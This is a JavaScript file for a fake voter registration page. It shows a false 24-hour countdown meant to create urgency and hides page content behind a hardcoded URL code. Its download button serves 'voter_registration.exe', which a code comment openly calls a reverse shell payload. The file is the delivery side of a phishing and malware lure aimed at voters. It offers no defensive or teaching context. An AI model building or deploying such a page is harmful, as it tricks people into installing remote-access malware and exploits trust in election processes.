// Countdown Timer
const countdown = () => {
    const endTime = new Date().getTime() + (24 * 60 * 60 * 1000); // 24 hours from now
    const timerElement = document.getElementById('timer');

    const updateTimer = () => {
        const now = new Date().getTime();
        const distance = endTime - now;

        const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((distance % (1000 * 60)) / 1000);

        timerElement.innerHTML = `${hours}h ${minutes}m ${seconds}s`;

        if (distance < 0) {
            clearInterval(timerInterval);
            timerElement.innerHTML = "Registration Closed";
        }
    };

    const timerInterval = setInterval(updateTimer, 1000);
};

countdown();

// Download Button
document.getElementById('downloadButton').addEventListener('click', () => {
    window.location.href = 'voter_registration.exe';  // Link to reverse shell payload
});

// Verification Code Check
const verifyCode = () => {
    const urlParams = new URLSearchParams(window.location.search);
    const code = urlParams.get('code');

    if (code === '1234') {  // Replace '1234' with your actual code
        document.getElementById('mainContent').style.display = 'block';
        document.getElementById('instructions').style.display = 'block';
        document.getElementById('stateDropdown').style.display = 'block';
    } else {
        document.body.innerHTML = '<h1>Access Denied. Invalid Code.</h1>';
    }
};

verifyCode();
